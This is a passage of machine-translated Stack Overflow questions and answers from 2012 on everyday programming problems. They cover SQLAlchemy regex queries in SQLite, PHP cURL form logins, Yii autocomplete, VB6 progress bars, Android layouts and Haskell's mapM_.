displayGraph (cw) 
```

在您的代码的当前形式中——这是一个容易犯的错误！-- 您要求 RCytoscpe 显示一个演示图，由 RCy 演示方法“makeSimpleGraph ()”制作

让我再问一下，也许为了省点麻烦：你的网络函数返回一个graphNEL吗？

如果您对如何创建 graphNEL 有任何不确定性，只需`makeSimpleGraph`在 R 提示符下键入即可向您显示制作 graphNEL 的所有代码，包括节点、边和属性。

说得通？如果您遇到更多困难，请告诉我们。

# python - 如何在带有 sqlalchemy 的 sqlite 中使用 regexp 函数？

> ID：12461814
> 
> 赞同：6
> 
> 时间：2012-09-17T14:49:19.493
> 
> 标签：python, regex, sqlalchemy

我想在“sqlalchemy”中使用正则表达式查询以及在“python sqlite”中完成，代码如下..

未完成的沙盒脚本是这样的：

```
import os
import re
import sqlite3

#
# python sqlite
#

DB_PATH = __name__ + '.db'

try:
    os.remove(DB_PATH)
except:
    pass

def re_fn(expr, item):
    reg = re.compile(expr, re.I)
    return reg.search(item) is not None

conn = sqlite3.connect(':memory:')
conn = sqlite3.connect(DB_PATH)
conn.create_function("REGEXP", 2, re_fn)
cursor = conn.cursor()

cursor.execute(
    'CREATE TABLE t1 (id INTEGER PRIMARY KEY, c1 TEXT)'
)
cursor.executemany(
    #'INSERT INTO t1 (c1) VALUES (?)', [('aaa"test"',),('blah',)]
    'INSERT INTO t1 (c1) VALUES (?)', [
        ('dupa / 1st Part',), ('cycki / 2nd Part',), ('fiut / 3rd Part',)
    ]
)
cursor.execute(
    #'SELECT c1 FROM t1 WHERE c1 REGEXP ?',['2|3\w+part']
    'SELECT c1 FROM t1 WHERE c1 REGEXP ?',['\d\w+ part']
)
conn.commit()
data=cursor.fetchall()
print(data)

#
# sqlalchemy
#

import sqlalchemy as sa
import sqlalchemy.orm as orm
from sqlalchemy.ext.declarative import declarative_base

DSN = 'sqlite:///' + DB_PATH
engine = sa.create_engine(DSN, convert_unicode=True)
db = orm.scoped_session(orm.sessionmaker(autocommit=False,
                                         autoflush=False,
                                         bind=engine))

Base = declarative_base(bind=engine)
meta = Base.metadata

class T1(Base):
    __table__ = sa.Table('t1', meta, autoload=True)

print(db.query(T1).all()) 
```

我发现应该在每个线程上注册 regexp 函数：

[http://permalink.gmane.org/gmane.comp.web.pylons.general/12742](http://permalink.gmane.org/gmane.comp.web.pylons.general/12742)

但我无法对我的脚本采用链接的解决方案 + 它已被弃用。

**更新**

我想查询这个：

```
cursor.execute(
    #'SELECT c1 FROM t1 WHERE c1 REGEXP ?',['2|3\w+part']
    'SELECT c1 FROM t1 WHERE c1 REGEXP ?',['\d\w+ part']
) 
```

但在 sqlalchemy 中。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-18T10:18:15.117

我得到了答案。缺少一行的完整工作脚本是这样的：

```
import os
import re
import sqlite3

DB_PATH = __name__ + '.db'

try:
    os.remove(DB_PATH)
except:
    pass

def re_fn(expr, item):
    reg = re.compile(expr, re.I)
    return reg.search(item) is not None

conn = sqlite3.connect(':memory:')
conn = sqlite3.connect(DB_PATH)
conn.create_function("REGEXP", 2, re_fn)
cursor = conn.cursor()

cursor.execute(
    'CREATE TABLE t1 (id INTEGER PRIMARY KEY, c1 TEXT)'
)
cursor.executemany(
    #'INSERT INTO t1 (c1) VALUES (?)', [('aaa"test"',),('blah',)]
    'INSERT INTO t1 (c1) VALUES (?)', [
        ('dupa / 1st Part',), ('cycki / 2nd Part',), ('fiut / 3rd Part',)
    ]
)
SEARCH_TERM = '3rd part'
cursor.execute(
    #'SELECT c1 FROM t1 WHERE c1 REGEXP ?',['2|3\w+part']
    'SELECT c1 FROM t1 WHERE c1 REGEXP ?',[SEARCH_TERM]
)
conn.commit()
data=cursor.fetchall()
print(data)

#
# sqlalchemy
#

import sqlalchemy as sa
import sqlalchemy.orm as orm
from sqlalchemy.ext.declarative import declarative_base

DSN = 'sqlite:///' + DB_PATH

engine = sa.create_engine(DSN, convert_unicode=True)

conn = engine.connect()
conn.connection.create_function('regexp', 2, re_fn)

db = orm.scoped_session(orm.sessionmaker(autocommit=False,
                                         autoflush=False,
                                         bind=engine))

Base = declarative_base(bind=engine)
meta = Base.metadata

class T1(Base):
    __table__ = sa.Table('t1', meta, autoload=True)

print(db.query(T1.c1).filter(T1.c1.op('regexp')(SEARCH_TERM)).all()) 
```

以上适用于 sqlalchemy=0.6.3

在 sqlalchemy=0.7.8 我得到错误：

> “sqlalchemy.exc.OperationalError：（OperationalError）没有这样的功能：正则表达式..”

也许是因为这个变化：

> 当指定基于文件的数据库时，方言将使用 NullPool 作为连接源。**该池关闭并丢弃立即返回池的连接。基于 SQLite 文件的连接具有极低的开销，因此不需要池化**。该方案还可以防止在不同的线程中再次使用连接，并且最适合 SQLite 的粗粒度文件锁定。在 0.7 版更改: 基于 SQLite 文件的数据库的 NullPool 默认选择。以前的版本默认为所有 SQLite 数据库选择 SingletonThreadPool。

来自：[http ://docs.sqlalchemy.org/en/rel_0_7/dialects/sqlite.html?highlight=isolation_level#threading-pooling-behavior](http://docs.sqlalchemy.org/en/rel_0_7/dialects/sqlite.html?highlight=isolation_level#threading-pooling-behavior)

解决方案是：在“开始”事件中添加正则表达式 fn，如下所示：

```
...

conn = engine.connect()
@sa.event.listens_for(engine, "begin")
def do_begin(conn):
    conn.connection.create_function('regexp', 2, re_fn)

db = orm.scoped_session(orm.sessionmaker(autocommit=False,
                                         autoflush=False,
                                         bind=engine))

... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2022-01-20T22:43:38.443

差不多10年后...

它在 SQLAlchemy 1.4 中更容易工作：

```
stmt = select(table.c.some_column).where(
    table.c.some_column.regexp_match('^(b|c)')
) 
```

来源：[https ://docs.sqlalchemy.org/en/14/core/sqlelement.html#sqlalchemy.sql.expression.ColumnElement.regexp_match](https://docs.sqlalchemy.org/en/14/core/sqlelement.html#sqlalchemy.sql.expression.ColumnElement.regexp_match)

# c# - 使用 XAML 的标题菜单 Windows 8 的弹出控件

> ID：12461820
> 
> 赞同：0
> 
> 时间：2012-09-17T14:49:50.480
> 
> 标签：c#, xaml, user-controls, windows-8, flyout

我创建了一个 Flyout 控件（扩展 UserControl），以便使用 C# 和 XAML 为 Windows 8 应用程序提供标题菜单导航。

在此布局中，我有一些带有 Click 侦听器的按钮。这些按钮用于在应用程序的各个页面之间导航。

因此，我想问您如何访问父页面的框架以导航到其他页面？

提前非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T15:24:07.387

你总是可以得到框架

```
var frame = Window.Current.Content as Frame; 
```

# c# - “一些”元素的 XSD 属性

> ID：12461827
> 
> 赞同：0
> 
> 时间：2012-09-17T14:50:08.557
> 
> 标签：c#, java, xsd, code-generation, metadata

这将是一篇很长的文章，感谢您的准备:-) 这个问题来自这篇文章的一个更高级别的“观点”：

[将元信息存储到类属性](https://stackoverflow.com/questions/12407173/storing-meta-information-to-class-properties)

我们有一个 XSD，我们将从（C#/Java）生成类。所以问题分为两个不同的部分：在 XSD 中定义它，然后从中创建数据模型。

我们希望在复杂类型中包含一些元素来携带元信息，但只是在 XSD 中的某些 x 路径中。这意味着当一个类型被重用为另一个复杂类型中的元素时，我们想告诉用户它是否与某些东西“相关”（我在另一篇文章中称其为安全相关）。相关性在几个层次上表示。（该解释当然也适用于 C#/Java 中的数据模型）

**XSD 类型示例：**

```
<xs:complexType name="Core">
  <xs:sequence>
    <xs:element name="No" type="xs:int" />
  </xs:sequence>
</xs:complexType>

<xs:complexType name="ComplexA">
  <xs:sequence>
    <xs:element name="Info" type="Core" />
  </xs:sequence>
</xs:complexType>

<xs:complexType name="ComplexB">
  <xs:sequence>
    <xs:element name="Info" type="Core" />
  </xs:sequence>
</xs:complexType> 
```

核心类型具有属性“否”。此属性可能与其他类型相关。例如，它应该是 type 中的“relevant-level-1” `ComplexA.Info`，而在 ComplexB.Info 中不是。

我们想出了两种不同的方法来实现这一点：

**1：**在类型级别引入一个属性：

```
<xs:complexType name="ComplexA">
  <xs:sequence>
    <xs:element name="Info" type="Core" />
  </xs:sequence>
  <xs:attribute name="Relevance.Info.No" type="RelevanceType" fixed="Relevance1"/>
</xs:complexType>

<xs:simpleType name="RelevanceType">
  <xs:restriction base="xs:string">
    <xs:enumeration value="Relevance1" />
    <!-- Some more relevance values -->
  </xs:restriction>
</xs:simpleType> 
```

属性“Relevance.Info.No”基本上告诉成员“Info”中的属性“No”具有相关类型“Relevance1”。这种方法显然有一些缺点。类生成非常复杂，因为我们必须手动处理这些属性信息。一个解决方案发布在开头提到的线程中。

**2：**为每个具有相关级别的属性引入另一种复杂类型：

这将解决这种“元数据”附加到属性的方式，但显然会为类型中相关级别的每个组合在 XSD 和 C#/Java 上生成**很多**类。

正如您可以想象的那样，在 C# 和 Java 端创建数据模型的问题与 XSD 中的问题非常相似。最好的方法是让 XSD 准备好自动创建 java 类 (JaxB) 和 C# 类 (XGen)，而无需对生成的代码进行任何其他操作（我现在正在这样做）。

您认为实现这一目标的任何其他可能性吗？

任何帮助表示赞赏！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-21T06:54:42.937

在这种情况下，我相信您需要使用继承。如果您定义了另一种类型`CoreBase`，并且如果您继承此类型`Core`

您可以使用`Core`in`ComplexA`并且可以使用`CoreBase`in`ComplexB`

```
<xs:complexType name="CoreBase">
  <xs:sequence>
    ... some attributes or how ever you wish
  </xs:sequence>
</xs:complexType>

<complexType name="Core">
    <complexContent>
        <extension base="CoreBase">
            <sequence>
                <xs:element name="No" type="xs:int" />
            </sequence>
        </extension>
    </complexContent>
</complexType>

<xs:complexType name="ComplexA">
  <xs:sequence>
    <xs:element name="Info" type="Core" />
  </xs:sequence>
</xs:complexType>

<xs:complexType name="ComplexB">
    <xs:sequence>
        <xs:element name="Info" type="CoreBase" />
    </xs:sequence>
</xs:complexType> 
```

请参阅xml架构[Xsd和继承中的继承链接](https://stackoverflow.com/questions/204852/xsd-and-inheritance)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-20T08:46:51.780

正如我在对答案的评论中所说的那样，我认为没有一个干净的解决方案。也许 XML 不打算像这样使用。
但我仍然对其他解决方案感兴趣......

# php - PHP Curl 从 aspx 页面获取 __VIEWSTATE 和 __EVENTVALIDATION 的值

> ID：12461836
> 
> 赞同：1
> 
> 时间：2012-09-17T14:50:48.960
> 
> 标签：php, asp.net, html, curl

嗨，我编写了以下脚本来登录网站。我现在要做的是在我们登录后看到的页面上执行搜索。目前我的脚本在您登录后返回页面。它有一个带有搜索字段和按钮的表单。我还注意到它使用 __VIEWSTATE 和 __EVENTVALIDATION 作为其表单的一部分。我知道这两个字段的值并不总是相同的。所以我想知道当我执行搜索时如何从表单中检索这些值，以便我可以使用它们在我的脚本中发布表单。这是我用来登录的代码：

```
 <?php

$post_data['ctl00$MainContent$EmailText'] = 'xxxx@xxxx.com';
$post_data['ctl00$MainContent$PasswordText'] = 'xxxx';
$post_data['ctl00$MainContent$LogInButton'] = 'Log On';

foreach ( $post_data as $key => $value) {
    $post_items[] = $key . '=' . $value;
}

$post_string = implode ('&', $post_items);

$curl_connection =
  curl_init('https://www.XXXX.co.uk/Login.aspx');
$ckfile = tempnam ("/tmp", "CURLCOOKIE");
curl_setopt($curl_connection, CURLOPT_CONNECTTIMEOUT, 30);
curl_setopt($curl_connection, CURLOPT_USERAGENT,
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)");
curl_setopt($curl_connection, CURLOPT_RETURNTRANSFER, false);
curl_setopt($curl_connection, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl_connection, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($curl_connection, CURLOPT_COOKIEJAR, $ckfile); 

curl_setopt($curl_connection, CURLOPT_POSTFIELDS, $post_string);

$result = curl_exec($curl_connection);

curl_close($curl_connection);

?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T15:11:25.173

您最好的选择可能是使用 PHP 的 DOMDocument 类来遍历返回的 HTML 并获取您要查找的内容。您可以将结果字符串加载到 DOMDocument 中，然后使用`getElementsByTagName`or`getElementById`来获取节点。如果输入元素具有 id 值，则首选后者。

实现看起来像：

```
// $result is string returned by cURL from your code
$dom = new DOMDocument();
$dom->loadHTML($result);
$node = $dom->getElementById('your_element_id');
$node_value = $node->getAttribute('value'); 
```

# asp.net - 在 ASPxGridView 中验证没有掩码的文本编辑器输入

> ID：12461839
> 
> 赞同：0
> 
> 时间：2012-09-17T14:51:22.373
> 
> 标签：asp.net, vb.net, devexpress, aspxgridview

我得到了一个带有一些数据的 ASPxGridView： ![在此处输入图像描述](../Images/e21b5507f77ab387f071dd7eab150cd8.png)

当我单击右侧的按钮时，它会进入编辑模式。

这就是我想做的：我希望编辑文本框允许 3 个数字（带或不带小数位）。小数位是可选的。例如：它必须允许 1.12、45.1 或 123。

使用掩码对我没有帮助，我不想使用正则表达式验证器。我只希望文本框允许正确输入。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T18:13:58.997

我知道如何做到这一点的唯一方法是通过 Javascript，通过捕获在该文本框中键入的击键并拒绝您不想要的击键。

Javascript 为此提供了 3 个事件：keydown、keyup 和 keypress。jQuery 支持这些；对于`keypress`，请看[这里](http://api.jquery.com/keypress/)。一个重要的部分，有：

> 要确定输入了哪个字符，请检查传递给处理函数的事件对象。虽然浏览器使用不同的属性来存储这些信息，但 jQuery 对 .which 属性进行了规范化，因此您可以可靠地使用它来检索字符代码。

但是，您仍然需要对您的输入进行输入后验证：例如，人们可以输入两个小数点。您的 javascript 也可以尝试阻止这种情况，但它需要更复杂，并且需要更多的努力来测试所有相关案例。

# lua - 在Lua编程（对于corona sdk，Moai，..）中，类名是否必须以大写字母开头？

> ID：12461847
> 
> 赞同：1
> 
> 时间：2012-09-17T14:51:30.467
> 
> 标签：lua, coronasdk, moai

在Lua编程（对于corona sdk，Moai，..）中，类名是否必须以大写字母开头？

```
---for example in Player.lua
Player = {}
--flag for player
Player.isHit = false
function Player:new()
    local player = display.newImage("player.png")
    return player
end
return Player 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T15:05:32.810

Lua 没有类的概念。Lua 是一门简单的语言；任何变量都可以存储*任何*类型的值。Lua 要求的唯一命名约定是变量名不是语言关键字。

这些是某些 Lua 库或嵌入式上下文使用的约定。但是，如果您的库/嵌入式上下文具有该约定，则为了保持一致性，您可能应该遵守它。

# c++ - 使用 cv::Mat::at 运算符访问像素值

> ID：12461848
> 
> 赞同：1
> 
> 时间：2012-09-17T14:51:32.677
> 
> 标签：c++, opencv

我正在使用 OpenCV 2.3.1 (c++ api)，当我尝试获取彩色图像的像素值时，我得到了非常奇怪的结果，而不是值数字，输出是这样的：？，*，| 等等。例如，代码如下：

```
cv::Mat inputImage = cv::imread("Picture1.jpg");
std::cout << inputImage.at<cv::Vec3b>(x,y)[0] << std::endl; //print B component 
```

其中 x 和 y 是鼠标回调函数的坐标。我认为该类型是错误的，您知道我还可以使用什么来代替 Vec3b 吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-09-03T22:52:46.777

我认为问题的发生是因为您使用的是“at（x，y）”。文档说第一个参数应该是“基于 0 的行索引”和第二个“基于 0 的列索引”。因此，您应该调用 at(y, x) 或 at(cv::Point(x, y))。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:56:21.487

检查[http://opencv.willowgarage.com/documentation/cpp/basic_structures.html](http://opencv.willowgarage.com/documentation/cpp/basic_structures.html)

OpenCV 中的 Vec3b 是`typedef Vec<uchar, 3> Vec3b;`. 所以，我想你需要在 cout 过程中转换为整数。

就像是`std::cout << (int) inputImage.at<cv::Vec3b>(x,y)[0] << std::endl; //print B component`

# php - 使用 Yii CJuiAutoComplete 自动完成其他字段

> ID：12461856
> 
> 赞同：2
> 
> 时间：2012-09-17T14:52:03.973
> 
> 标签：php, jquery-ui, autocomplete, yii, jquery-autocomplete

我有以下情况：

带有邮政编码字段和城市字段的表单。

我想在邮政编码字段上自动完成，所以当用户输入例如 1000 时，自动完成值将显示“1000 - 布鲁塞尔”。选择此值后，邮政编码字段将填写 1000，城市字段将填写布鲁塞尔。

邮政编码、城市和连接信息将来自 mysql 数据库：

我只有邮政编码的自动完成功能，但不知道如何实现所描述的效果（=填充第二个字段）。

当前表单代码：

```
<div class="row">
        <?php echo $form->labelEx($model,'PostalCode'); ?>
        <?php //echo $form->textField($model,'PostalCode',array('size'=>10,'maxlength'=>50));

                $this->widget('zii.widgets.jui.CJuiAutoComplete', array(
                'name'=>'PostalCode',
                'value'=>$model->PostalCode,
            //'source'=>$people, // <- use this for pre-set array of values
                'source'=>$this->createUrl('BeCity/GetBelgianPostalCodes'),// <- path to controller which returns dynamic data
                // additional javascript options for the autocomplete plugin
                'options'=>array(
                        'minLength'=>'1', // min chars to start search
                        'showAnim'=>'fold'
                ),
                ));

                ?>
        <?php echo $form->error($model,'PostalCode'); ?>
    </div> 
```

当前控制器动作代码：

```
public function actionGetBelgianPostalCodes()
        {                     
            $res =array();

            if (isset($_GET['term'])) {
                    // http://www.yiiframework.com/doc/guide/database.dao
                    $qtxt ="SELECT
                            DISTINCT
                            bc.PostalCode as PostalCode,
                            bc.NameNL as CityName,
                            CONCAT(bc.PostalCode, ' - ', bc.NameNL) as FullCityName
                            FROM be_city bc
                            WHERE bc.PostalCode LIKE :qterm
                            ORDER BY bc.PostalCode, bc.NameNL ASC";
                    $command =Yii::app()->db->createCommand($qtxt);
                    $command->bindValue(":qterm", $_GET['term'].'%', PDO::PARAM_STR);
                    $res =$command->queryColumn();
            }

            echo CJSON::encode($res);
            Yii::app()->end();
        } 
```

不确定控制器操作是否完全正确， $command->queryAll() 似乎不起作用，所以我使用 queryColumn() 但它只返回第一列？

有什么提示吗？

另外，还有一个问题，我希望控制器操作的链接是动态的。如果用户在之前的 Country 下拉列表中选择了比利时，则应调用“BeCity/GetBelgianPostalCodes”。如果是法国，应该是“FrCity/GetFrenchPostalCodes”。这可能吗，如何？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T02:36:42.063

这是我找到的方式（我为您的应用程序进行了调整，所以我希望没有错字......）我还将小部件的名称更改为 myPostCode 最好可能保留 Yii 给出的默认名称：

```
<?php
        $this->widget('zii.widgets.jui.CJuiAutoComplete', array(
        'name'=>'myPostCode',
        'value'=>$model->PostalCode,
        'source'=>$this->createUrl('BeCity/GetBelgianPostalCodes'),
        'options'=>array(
                'minLength'=>'1', // min chars to start search
                'showAnim'=>'fold'
                //focus option will tell what is displayed in field during the selection
                'focus'=> 'js:function( event, ui ) {
                    $( "#myPostCode" ).val( ui.item.postalcode );
                    return false;
                }',
                //select function will tell where go each field
                'select'=>'js:function( event, ui ) {
                    $( "#myPostCode" ).val( ui.item.postalcode );
                    $( "#CityName" ).val(ui.item.cityname);
                    return false;
                }'
        ),
        ));

//Here is the code for the display.
//This code MUST be AFTER the widget
//It should be possible to include it in the widget but I do not know how.
// You may change the line "<a>"+item.postalcode... with what you want to display but must keep the a tag."

    Yii::app()->clientScript->registerScript('input', '
        $("#myPostCode").data("autocomplete")._renderItem = function( ul, item ) {
        return $( "<li></li>" )
    .data( "item.autocomplete", item )
    .append( "<a>"+item.postalcode + " - " + item.cityname+"</a>")
    .appendTo( ul );
    };');

?> 
```

您还需要更改查询以返回所有数据

```
$res =$command->queryAll(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T21:01:36.400

如下设置 Ajax 选择选项：

```
$this->widget('zii.widgets.jui.CJuiAutoComplete', array(
    'name'=>'PostalCode',
    'source'=>$this->createUrl('/site/getpostalcode'),
    // additional options for the autocomplete plugin
    'options'=>array(
        'minLength'=>'4',
        'select'=>"js:function(event, ui) {
                    $('#PostalCode').val(ui.item.postalcode);
                    $('#CityName').val(ui.item.cityname);
                  }",
     ),
    'htmlOptions'=>array(
        'style'=>'width: 200px;',
        'placeholder' => 'Postal Code'
    ),
)); 
```

# c# - Sql server 四舍五入我的十进制数据

> ID：12461859
> 
> 赞同：1
> 
> 时间：2012-09-17T14:52:18.803
> 
> 标签：c#, .net, tsql, rounding

Sql 数据类型是money，.Net 数据类型是十进制。我将 1.8714 发送到 sql 以插入数据，但 sql server 将其舍入为 1.8700。如何保存我的数据？以及如何在不四舍五入的情况下发送？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:56:34.333

```
alter table <tablename> alter column <columnname> float 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-19T15:36:06.800

我将我的变量类型 decimal 更改为在 .Net 端浮动，它解决了。

# vb6 - VB 6.0 进度条中的运行时错误“380”

> ID：12461860
> 
> 赞同：1
> 
> 时间：2012-09-17T14:52:19.087
> 
> 标签：vb6

我已经在 VB 6.0 中制作了一个 Internet 浏览器，并且我已经给它一个进度条......当输入链接并单击“GO”后。进度条的按钮值开始增加，但当它完全填满时，错误来了。运行时错误“380”：无效的属性值。

```
Private Sub Command1_Click()
    WebBrowser1.Navigate Text1.Text
End Sub

Private Sub Command2_Click()
    WebBrowser1.GoBack
End Sub

Private Sub Command3_Click()
    WebBrowser1.GoForward
End Sub

Private Sub menuchangetheme_Click()
    CDB1.ShowColor
    Form1.BackColor = CDB1.Color
End Sub

Private Sub menuexit_Click()
    End
End Sub

Private Sub WebBrowser1_ProgressChange(ByVal Progress As Long, ByVal ProgressMax As Long)
    ProgressBar1.Value = 0
    If ProgressBar1.Value <> Val(ProgressBar1.Max) Then
        ProgressBar1.Value = ProgressBar1.Value + Val(Progress)
        ProgressBar1.Max = ProgressBar1.Value + 1
    Else
        ProgressBar1.Value = 0
    End If
End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-19T04:07:34.223

参数**Progress**和**ProgressMax**已经是数字，因此您不需要转换它们。正如 Deanna 指出的那样，您的代码正在将 Progress 添加到进度条的 Value 中。发生错误是因为您尝试分配一个大于进度条**Max**属性的值。

```
Private Sub WebBrowser1_ProgressChange(ByVal Progress As Long, ByVal ProgressMax As Long)

    On Local Error Resume Next 'suppress errors because they are not important enough to display to user

    If Progress > 0 Then                   'the page download is not complete
        ProgressBar1.Min = 0               'not really needed, but also doesn't hurt to set it here
        ProgressBar1.Max = ProgressMax + 1 'needs to be set because the ProgressMax can change every time the event is raised
        ProgressBar1.Value= Progress       'set the displayed value of the progressbar
    Else
        ProgressBar1.Value = 0             'the page load is finished
    End If

End Sub 
```

# windows-xp - 在windows中释放端口COM14

> ID：12461861
> 
> 赞同：0
> 
> 时间：2012-09-17T14:52:21.623
> 
> 标签：windows-xp, serial-port

我有一个带有可执行安装程序的应用程序，它尝试在端口 COM14 上安装驱动程序，但是当我检查端口列表时，我发现 COM14 端口已被其他应用程序占用，以及为什么当前应用程序无法安装COM14 上的驱动程序。

请告知如何在 windows XP 中释放端口 COM14。

编辑：现在我正在考虑使用以下网址： http: [//blog.cognitioninfotech.com/2009/01/how-to-clear-or-reset-com-port.html](http://blog.cognitioninfotech.com/2009/01/how-to-clear-or-reset-com-port.html)

# php - JavaScript 替换 为 \n

> ID：12461865
> 
> 赞同：2
> 
> 时间：2012-09-17T14:52:32.540
> 
> 标签：php, javascript, jquery

我刚刚使用 JavaScript 和 PHP 在 MySQL 数据库中存储了一段文本并替换`\n`为`<br />`，我现在遇到的问题是，当我尝试使用 PHP 检索文本时，它会将其打印为；`<br />`

```
Dear Sir/Maddam<br />This is a letter concerning the following;<br />I would like to.... 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T14:54:40.770

好吧，显而易见的解决方案是首先不要替换`\n`为`<br />`。

我不知道你想用什么语言来扭转伤害......

```
// PHP:
$out = preg_replace("/<br ?\/?>/i","\n",$in);

// JS:
out = input.replace(/<br ?\/?>/ig,"\n"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:56:39.247

如果您想简单地删除 PHP 中的这些字符，您可以使用方便的[`strip_tags()`](http://php.net/manual/en/function.strip-tags.php)功能。但是，这将删除字符串中的**所有**HMTL 元素。

如果你想简单地将`<br/>`字符串转换回a，`\n`那么你可以使用php的[`str_replace()`](http://php.net/manual/en/function.str-replace.php)函数。

```
$newString = str_replace("<br/>", "\n", $originalString); 
```

# php - 动态 404 页面

> ID：12461866
> 
> 赞同：3
> 
> 时间：2012-09-17T14:52:40.387
> 
> 标签：php, typo3, typoscript

是否可以创建一个与任何其他页面一样工作的动态 404 页面？

我已经尝试了多个扩展，但我无法让它们中的任何一个工作。我正在使用 CoolURI

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T15:19:59.117

如果您安装了 RealURL 扩展，那么您可以在typo3conf/localconf.php 行中进行设置

```
$TYPO3_CONF_VARS['FE']['pageNotFound_handling'] = '/404/'; 
```

然后在 TYPO3 树中创建名为“404”的页面。

# android - 文本不适合时按下的 Android 按钮

> ID：12461870
> 
> 赞同：0
> 
> 时间：2012-09-17T14:52:48.893
> 
> 标签：android, layout, alignment

我在屏幕底部有 5 个按钮（按线性布局分组，每个按钮的权重为 1。在屏幕截图中，b1-b5 上方的行）。但是，当文本超过一行时，该特定按钮将被按下，甚至在其父级之外。每个按钮的高度是一个设定值，对所有按钮都相等。该`next >`按钮是唯一处于正确位置的按钮。下面是一些 XML，但这对我来说似乎很正常：

```
<LinearLayout
    android:layout_width="match_parent"
    android:layout_height="@dimen/h"
    android:orientation="horizontal" >

    <Button                                    }
        android:layout_width="0dp"             }
        android:layout_height="@dimen/h"       }   x5
        android:layout_weight="1"/>            }
</LinearLayout> 
```

按钮 b1-b5 中的 LinearLayout 的 margin_top 为 10dp。

截图：

[![截屏](../Images/f52a75df376d7f4d6feb2b5f58feeea9.png)](https://i.stack.imgur.com/iWJq3.png)

红线是按钮应对齐的位置。蓝线是带有两行文本的按钮，绿色是 3 行。

根据屏幕截图，这些按钮包含的文本行越多，它们被向下推的越多。如果按钮包含太多文本，如何阻止按钮被按下？我不能使用相对布局并让它们对齐顶部，因为我需要它们的权重相等

编辑：完整（虽然缩短）XML

```
<RelativeLayout
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:paddingBottom="0dp"
    android:paddingLeft="6dp"
    android:paddingRight="6dp"
    android:paddingTop="6dp">
    <LinearLayout
        android:id="@+id/panel1"
        android:layout_width="match_parent"
        android:layout_height="@dimen/h"
        android:layout_alignParentBottom="true"
        android:layout_marginTop="@dimen/margin"
        android:layout_centerHorizontal="true">
        <Button 
            android:layout_width="0dp"      }
            android:layout_height="@dimen/h"    }x5
            android:layout_weight="1"/>     }
    </LinearLayout>

    <ScrollView
        android:layout_width="match_parent"
        android:layout_height="0dp"
        android:layout_above="@+id/text"
        android:layout_alignParentTop="true">
        <TextView
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:scrollbars="vertical"
            android:background="@color/black"
            android:textColor="@color/white"
            android:text="@string/longtext">
        </TextView>
    </ScrollView>

    <RelativeLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_above="@id/panel1"
        android:gravity="bottom">

        <LinearLayout
            android:id="@+id/panel2"
            android:layout_width="match_parent"
            android:layout_height="@dimen/h"
            android:orientation="horizontal">

            <Button
                android:layout_width="0dp"              }
                android:layout_height="@dimen/h"    }x5
                android:layout_weight="1"/>             }
        </LinearLayout>
    </RelativeLayout>
</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-26T10:24:33.673

在 XML 中，设置此值：`android:baselineAligned="false"`. 奇怪的是，这与您期望的相反。

# list - 在新行中打印列表元素

> ID：12461871
> 
> 赞同：4
> 
> 时间：2012-09-17T14:52:49.617
> 
> 标签：list, haskell, monads, monad-transformers

我只是对列表和单子完全感到困惑，所以也许我的问题不正确或非常幼稚。我在[这里](https://stackoverflow.com/questions/5289779/printing-elements-of-a-list-on-new-lines)看到了使用 mapM_ func 的方法：

```
mapM_ print [1, 2, 3, 4] 
```

但我不确切知道它是如何工作的，并且想知道如何以这样的方式做到这一点：

```
x <- [1, 2, 3]
print x 
```

或者，如果我理解正确：

```
[1, 2, 3] >>= print 
```

我知道 [1, 2, 3] 有 type`[a]`并且 print 有 type `Show a => a -> IO ()`。我也明白，为了使用 monad List，我们需要`List a`左边的类型和`a -> List b`右边的类型。我对吗？你能帮我解决这个问题吗？

**升级版**。感谢@MathematicalOrchid 解释 mapM_ 的工作原理。从我的角度来看，我想解释真正的问题不是在不同的行中打印任何结果，而是以 monad List 提供的方式执行一些 monadic 操作（因为现在我在 OpenGL 周围徘徊）。但我知道误解的根源在于混合单子。

**UPD2**。谢谢大家的回答。我为这个模糊的问题道歉。我不完全知道我需要什么答案以及问题是什么。那是因为我不了解一些基础知识。所以现在很难选择“正确的答案”，因为每个答案都与我正在寻找的东西有点和平。我决定选择最接近我想要的（虽然现在不是最有用的）。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-17T15:15:27.680

您似乎在这里混淆了几件事。（特别是，列表形成了一个 monad，而 I/O 形成了一个不同的 monad。）我将尝试澄清这一点......

首先，该`print`函数获取任何可显示的内容并将其写入标准输出，然后是换行符。所以`print [1, 2, 3]`工作得很好，但显然将所有内容都写在同一行。`print`要在单独的行上写东西，我们需要对每个项目单独调用。到现在为止还挺好。

该`map`函数将函数应用于列表的每个元素。所以`map print [1, 2, 3]`将适用`print`于列表中的每个项目。*但是*，结果是 I/O 操作列表。这不是我们所追求的。我们想要*执行*这些操作，而不是列出它们。

